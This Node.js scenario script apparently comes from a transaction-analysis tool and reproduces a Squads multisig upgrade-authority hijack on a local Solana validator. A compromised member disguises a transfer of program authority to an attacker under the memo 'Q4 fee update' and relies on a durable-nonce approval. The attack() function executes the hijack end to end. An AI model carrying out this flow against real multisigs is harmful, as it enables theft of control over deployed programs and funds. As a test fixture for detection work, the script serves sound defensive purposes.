#!/usr/bin/env node
/* global Buffer */
// Admin scenario on localnet (PLAN.md M4, task S3): the Squads upgrade hijack.
//   pnpm --filter @kelvara/scenarios scenario:admin-local            set up + emit the unsigned approval tx
//   pnpm --filter @kelvara/scenarios scenario:admin-local --attack   then really run the attack
//   pnpm --filter @kelvara/scenarios scenario:admin-local:attack     attack only, on the last setup
//
// Needs a running `localnet:up`. Setup:
//  1. Keys in <repo>/.keys/localnet/: members A, B, C, attacker, outsider (kept); per run a fresh multisig
//     create key and nonce account key in .keys/localnet/admin-run/.
//  2. Squads v4 multisig (the mainnet program cloned by localnet:up): council A, B, C, threshold 2, time lock 0,
//     no config authority.
//  3. The demo program's upgrade authority moves to the Squads vault (loader SetAuthority).
//  4. Durable nonce account created and funded by the outsider, nonce authority = Member A.
//  5. Member C (the insider/compromised member) creates vault transaction #n with memo "Q4 fee update" whose
//     only instruction is loader SetAuthority(programData, vault -> attacker), and an Active proposal for it.
//  6. Builds Member A's approval: AdvanceNonceAccount (A) + Memo "Q4 fee update" + proposalApprove, fee payer A,
//     recent blockhash = the nonce value. Written unsigned to .localnet/admin/approval.unsigned.b64 for
//     `kelvara analyze`, with all addresses in .localnet/admin/scenario.json.
// Attack: A signs those exact bytes and submits (durable nonce, valid any time), B approves, C executes; the
// script reads the program back and fails unless the upgrade authority is now the attacker.
import { execFileSync } from 'node:child_process';
import { existsSync, mkdirSync, readFileSync, writeFileSync } from 'node:fs';
import { dirname, join, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import {
  PERMISSION_ALL,
  compileVaultMessage,
  multisigCreateV2,
  multisigPda,
  proposalApprove,
  proposalCreate,
  proposalPda,
  readMultisig,
  readProposal,
  transactionPda,
  vaultPda,
  vaultTransactionCreate,
  vaultTransactionExecute
} from './lib/squads.mjs';
import { BPF_LOADER_UPGRADEABLE, SYSTEM_PROGRAM, b58decode, b58encode, compileLegacy, localRpc, readKeypair, signLegacy } from './lib/tx.mjs';

const here = dirname(fileURLToPath(import.meta.url));
const PKG = resolve(here, '..');
const REPO = resolve(PKG, '../..');
const STATE = join(PKG, '.localnet', 'state.json');
const OUT = join(PKG, '.localnet', 'admin');
const KEYS = join(REPO, '.keys', 'localnet');
const RUN_KEYS = join(KEYS, 'admin-run');

export const MEMO = 'Q4 fee update';
const MEMO_PROGRAM = 'MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr';
const RECENT_BLOCKHASHES = 'SysvarRecentB1ockHashes11111111111111111111';
const RENT_SYSVAR = 'SysvarRent111111111111111111111111111111111';
const NONCE_SPACE = 80;
const STABLE_KEYS = ['member-a', 'member-b', 'member-c', 'attacker', 'outsider'];

const log = (...a) => console.log('[admin-local]', ...a);

function keygen(path, force) {
  if (existsSync(path) && !force) return;
  execFileSync('solana-keygen', ['new', '--no-bip39-passphrase', '--silent', '--force', '-o', path], { stdio: ['ignore', 'ignore', 'inherit'] });
}

const u32le = (n) => {
  const b = Buffer.alloc(4);
  b.writeUInt32LE(n);
  return b;
};
const u64le = (n) => {
  const b = Buffer.alloc(8);
  b.writeBigUInt64LE(BigInt(n));
  return b;
};
const meta = (pubkey, isSigner, isWritable) => ({ pubkey, isSigner, isWritable });

// ---- System program ----
const createAccount = (from, to, lamports, space, owner) => ({
  programId: SYSTEM_PROGRAM,
  keys: [meta(from, true, true), meta(to, true, true)],
  data: Buffer.concat([u32le(0), u64le(lamports), u64le(space), Buffer.from(b58decode(owner))])
});
const initializeNonce = (nonce, authority) => ({
  programId: SYSTEM_PROGRAM,
  keys: [meta(nonce, false, true), meta(RECENT_BLOCKHASHES, false, false), meta(RENT_SYSVAR, false, false)],
  data: Buffer.concat([u32le(6), Buffer.from(b58decode(authority))])
});
const advanceNonce = (nonce, authority) => ({
  programId: SYSTEM_PROGRAM,
  keys: [meta(nonce, false, true), meta(RECENT_BLOCKHASHES, false, false), meta(authority, true, false)],
  data: u32le(4)
});
const transfer = (from, to, lamports) => ({
  programId: SYSTEM_PROGRAM,
  keys: [meta(from, true, true), meta(to, false, true)],
  data: Buffer.concat([u32le(2), u64le(lamports)])
});
const memoIx = (text) => ({ programId: MEMO_PROGRAM, keys: [], data: Buffer.from(text, 'utf8') });

// ---- BPF loader upgradeable ----
// SetAuthority (tag 4): [programData (w), current authority (s), new authority]
const loaderSetAuthority = (programData, current, next) => ({
  programId: BPF_LOADER_UPGRADEABLE,
  keys: [meta(programData, false, true), meta(current, true, false), meta(next, false, false)],
  data: u32le(4)
});

async function accountData(rpc, pubkey) {
  const { value } = await rpc.call('getAccountInfo', [pubkey, { encoding: 'base64', commitment: 'confirmed' }]);
  return value ? { ...value, bytes: Buffer.from(value.data[0], 'base64') } : null;
}

// Program account: u32 tag 2 + programData. ProgramData: u32 tag 3, u64 slot, Option<Pubkey> authority.
export async function readUpgradeAuthority(rpc, programId) {
  const prog = await accountData(rpc, programId);
  if (!prog || prog.bytes.readUInt32LE(0) !== 2) throw new Error(`${programId} is not an upgradeable program`);
  const programData = b58encode(prog.bytes.subarray(4, 36));
  const pd = await accountData(rpc, programData);
  const authority = pd.bytes[12] === 1 ? b58encode(pd.bytes.subarray(13, 45)) : null;
  return { programData, authority };
}

async function readNonce(rpc, nonce) {
  const acc = await accountData(rpc, nonce);
  if (!acc || acc.owner !== SYSTEM_PROGRAM || acc.bytes.length !== NONCE_SPACE) throw new Error(`${nonce} is not a nonce account`);
  return { authority: b58encode(acc.bytes.subarray(8, 40)), value: b58encode(acc.bytes.subarray(40, 72)), lamports: acc.lamports };
}

function loadState() {
  if (!existsSync(STATE)) throw new Error('no .localnet/state.json; run `pnpm --filter @kelvara/scenarios localnet:up` first');
  return JSON.parse(readFileSync(STATE, 'utf8'));
}

export async function setup() {
  const state = loadState();
  const rpc = localRpc(state.rpcUrl);
  await rpc.call('getHealth');

  mkdirSync(RUN_KEYS, { recursive: true, mode: 0o700 });
  for (const n of STABLE_KEYS) keygen(join(KEYS, `${n}.json`), false);
  keygen(join(RUN_KEYS, 'create-key.json'), true);
  keygen(join(RUN_KEYS, 'nonce.json'), true);
  const k = Object.fromEntries(STABLE_KEYS.map((n) => [n, readKeypair(join(KEYS, `${n}.json`))]));
  const createKey = readKeypair(join(RUN_KEYS, 'create-key.json'));
  const nonceKey = readKeypair(join(RUN_KEYS, 'nonce.json'));
  const demoAuthority = readKeypair(join(REPO, state.keyFiles['demo-upgrade-authority']));

  for (const n of ['member-a', 'member-b', 'member-c', 'outsider']) await rpc.airdrop(k[n].publicKey, 10e9);

  // 1. council
  const programConfig = state.squads.programConfig;
  const treasury = state.squads.accounts.find((a) => a.role === 'treasury').pubkey;
  const multisig = multisigPda(createKey.publicKey);
  const vault = vaultPda(multisig, 0);
  const members = ['member-a', 'member-b', 'member-c'].map((n) => ({ key: k[n].publicKey, permissions: PERMISSION_ALL }));
  await rpc.send(
    [multisigCreateV2({ programConfig, treasury, multisig, createKey: createKey.publicKey, creator: k['member-c'].publicKey, threshold: 2, members, timeLock: 0, memo: 'Ops council' })],
    k['member-c'],
    [createKey]
  );
  const ms = readMultisig((await accountData(rpc, multisig)).bytes);
  if (ms.threshold !== 2 || ms.timeLock !== 0) throw new Error(`multisig created with threshold ${ms.threshold}, time lock ${ms.timeLock}`);
  log(`multisig ${multisig} (2 of 3, time lock 0), vault ${vault}`);
  // The vault pays nothing in this scenario, but a funded vault is what a real council has.
  await rpc.send([transfer(k['member-c'].publicKey, vault, 1e9)], k['member-c'], []);

  // 2. vault becomes the demo program's upgrade authority
  const { programData, authority: before } = await readUpgradeAuthority(rpc, state.demo.programId);
  const holders = new Map([[demoAuthority.publicKey, demoAuthority], [k.attacker.publicKey, k.attacker]]);
  const holder = holders.get(before);
  if (!holder) throw new Error(`demo program upgrade authority is ${before}, not a key we hold; run localnet:up for a fresh validator`);
  await rpc.send([loaderSetAuthority(programData, holder.publicKey, vault)], k['member-c'], [holder]);
  const after = (await readUpgradeAuthority(rpc, state.demo.programId)).authority;
  if (after !== vault) throw new Error(`upgrade authority is ${after}, expected the vault`);
  log(`demo program ${state.demo.programId} upgrade authority -> Squads vault`);

  // 3. durable nonce funded by an outsider, authority Member A
  const rent = await rpc.call('getMinimumBalanceForRentExemption', [NONCE_SPACE]);
  await rpc.send(
    [createAccount(k.outsider.publicKey, nonceKey.publicKey, rent, NONCE_SPACE, SYSTEM_PROGRAM), initializeNonce(nonceKey.publicKey, k['member-a'].publicKey)],
    k.outsider,
    [nonceKey]
  );
  const nonce = await readNonce(rpc, nonceKey.publicKey);
  if (nonce.authority !== k['member-a'].publicKey) throw new Error('nonce authority mismatch');
  log(`nonce ${nonceKey.publicKey} funded by outsider ${k.outsider.publicKey}, authority Member A`);

  // 4. the "Q4 fee update" proposal: vault transaction = loader SetAuthority(vault -> attacker)
  const transactionIndex = ms.transactionIndex + 1n;
  const transaction = transactionPda(multisig, transactionIndex);
  const proposal = proposalPda(multisig, transactionIndex);
  const inner = loaderSetAuthority(programData, vault, k.attacker.publicKey);
  const vaultAccounts = [vault, programData, k.attacker.publicKey, BPF_LOADER_UPGRADEABLE];
  const message = compileVaultMessage({
    accountKeys: vaultAccounts,
    numSigners: 1,
    numWritableSigners: 0,
    numWritableNonSigners: 1,
    instructions: [{ programId: BPF_LOADER_UPGRADEABLE, keys: inner.keys.map((x) => x.pubkey), data: inner.data }]
  });
  const c = k['member-c'];
  await rpc.send(
    [
      vaultTransactionCreate({ multisig, transaction, creator: c.publicKey, rentPayer: c.publicKey, message, memo: MEMO }),
      proposalCreate({ multisig, proposal, creator: c.publicKey, rentPayer: c.publicKey, transactionIndex })
    ],
    c,
    []
  );
  const prop = readProposal((await accountData(rpc, proposal)).bytes);
  if (prop.status !== 'Active') throw new Error(`proposal status ${prop.status}`);
  log(`proposal #${transactionIndex} "${MEMO}" ${proposal} Active`);

  // 5. Member A's approval, unsigned, on the durable nonce
  const a = k['member-a'];
  const compiled = compileLegacy({
    feePayer: a.publicKey,
    instructions: [advanceNonce(nonceKey.publicKey, a.publicKey), memoIx(MEMO), proposalApprove({ multisig, member: a.publicKey, proposal, memo: MEMO })],
    recentBlockhash: nonce.value
  });
  const unsigned = Buffer.concat([Buffer.from([compiled.signers.length]), Buffer.alloc(64 * compiled.signers.length), Buffer.from(compiled.message)]);
  // Simulating the approval moves no lamports or tokens; record what the validator says so the story is checkable.
  const watched = [a.publicKey, vault, k.outsider.publicKey];
  const pre = (await rpc.call('getMultipleAccounts', [watched, { encoding: 'base64', commitment: 'confirmed' }])).value.map((x) => x?.lamports ?? 0);
  const sim = await rpc.call('simulateTransaction', [
    unsigned.toString('base64'),
    { encoding: 'base64', sigVerify: false, replaceRecentBlockhash: false, commitment: 'confirmed', accounts: { encoding: 'base64', addresses: watched } }
  ]);
  if (sim.value.err) throw new Error(`approval simulation failed: ${JSON.stringify(sim.value.err)}`);

  mkdirSync(OUT, { recursive: true });
  writeFileSync(join(OUT, 'approval.unsigned.b64'), unsigned.toString('base64') + '\n');
  const scenario = {
    scenario: 'admin-local',
    createdAt: new Date().toISOString(),
    rpcUrl: state.rpcUrl,
    memo: MEMO,
    demoProgram: state.demo.programId,
    programData,
    squadsProgram: state.squads.program.programId,
    multisig,
    vault,
    threshold: 2,
    timeLock: 0,
    members: { A: a.publicKey, B: k['member-b'].publicKey, C: c.publicKey },
    attacker: k.attacker.publicKey,
    outsider: k.outsider.publicKey,
    nonce: { account: nonceKey.publicKey, authority: a.publicKey, funder: k.outsider.publicKey, value: nonce.value },
    transactionIndex: transactionIndex.toString(),
    vaultTransaction: transaction,
    proposal,
    vaultMessageAccounts: vaultAccounts.map((pubkey, i) => ({ pubkey, isWritable: i === 1 })),
    approval: {
      file: 'packages/scenarios/.localnet/admin/approval.unsigned.b64',
      signers: compiled.signers,
      feePayer: a.publicKey,
      instructions: ['System AdvanceNonceAccount', `Memo "${MEMO}"`, 'Squads proposalApprove'],
      // Only the fee leaves Member A; the vault and the outsider are untouched. No token accounts are involved.
      simulation: {
        err: null,
        unitsConsumed: sim.value.unitsConsumed,
        lamportsDelta: Object.fromEntries(watched.map((p, i) => [p, (sim.value.accounts[i]?.lamports ?? 0) - pre[i]]))
      }
    },
    keyFiles: {
      ...Object.fromEntries(STABLE_KEYS.map((n) => [n, `.keys/localnet/${n}.json`])),
      createKey: '.keys/localnet/admin-run/create-key.json',
      nonce: '.keys/localnet/admin-run/nonce.json'
    }
  };
  writeFileSync(join(OUT, 'scenario.json'), JSON.stringify(scenario, null, 2) + '\n');
  log(`approval tx (unsigned, ${unsigned.length} bytes) -> ${scenario.approval.file}`);
  log(`input for kelvara analyze: ${scenario.approval.file} (base64 wire tx, signature slot zeroed), RPC ${state.rpcUrl}`);
  return scenario;
}

export async function attack() {
  const s = JSON.parse(readFileSync(join(OUT, 'scenario.json'), 'utf8'));
  const rpc = localRpc(s.rpcUrl);
  const kp = (n) => readKeypair(join(REPO, s.keyFiles[n]));
  const [a, b, c] = ['member-a', 'member-b', 'member-c'].map(kp);

  // Member A signs the exact emitted bytes (what the wallet would sign), later, on the durable nonce.
  const wire = Buffer.from(readFileSync(join(OUT, 'approval.unsigned.b64'), 'utf8').trim(), 'base64');
  if (wire[0] !== 1) throw new Error('approval expected exactly one signer (Member A)');
  const message = wire.subarray(65);
  const signed = signLegacy({ message, signers: [a.publicKey] }, [a]);
  await rpc.call('sendTransaction', [Buffer.from(signed.wire).toString('base64'), { encoding: 'base64', preflightCommitment: 'confirmed' }]);
  await rpc.confirm(signed.signature);
  log(`Member A approval landed on the durable nonce: ${signed.signature}`);

  await rpc.send([proposalApprove({ multisig: s.multisig, member: b.publicKey, proposal: s.proposal, memo: MEMO })], b, []);
  const p = readProposal((await accountData(rpc, s.proposal)).bytes);
  if (p.status !== 'Approved') throw new Error(`proposal status ${p.status} after 2 approvals`);
  log('Member B approved: proposal Approved (2 of 3)');

  const execSig = await rpc.send(
    [vaultTransactionExecute({ multisig: s.multisig, proposal: s.proposal, transaction: s.vaultTransaction, member: c.publicKey, remaining: s.vaultMessageAccounts })],
    c,
    []
  );
  const { authority } = await readUpgradeAuthority(rpc, s.demoProgram);
  if (authority !== s.attacker) throw new Error(`upgrade authority is ${authority} after execute, expected attacker ${s.attacker}`);
  log(`executed ${execSig}: demo program ${s.demoProgram} upgrade authority is now the attacker ${s.attacker}`);
  const result = { approvalSignature: signed.signature, executeSignature: execSig, upgradeAuthorityAfter: authority, at: new Date().toISOString() };
  writeFileSync(join(OUT, 'attack.json'), JSON.stringify(result, null, 2) + '\n');
  return result;
}

if (process.argv[1] && resolve(process.argv[1]) === fileURLToPath(import.meta.url)) {
  const args = process.argv.slice(2);
  const run = args.includes('--attack-only') ? attack : args.includes('--attack') ? async () => (await setup(), attack()) : setup;
  run().then(
    () => process.exit(0),
    (e) => {
      console.error('[admin-local]', e?.message ?? e);
      process.exit(1);
    }
  );
}
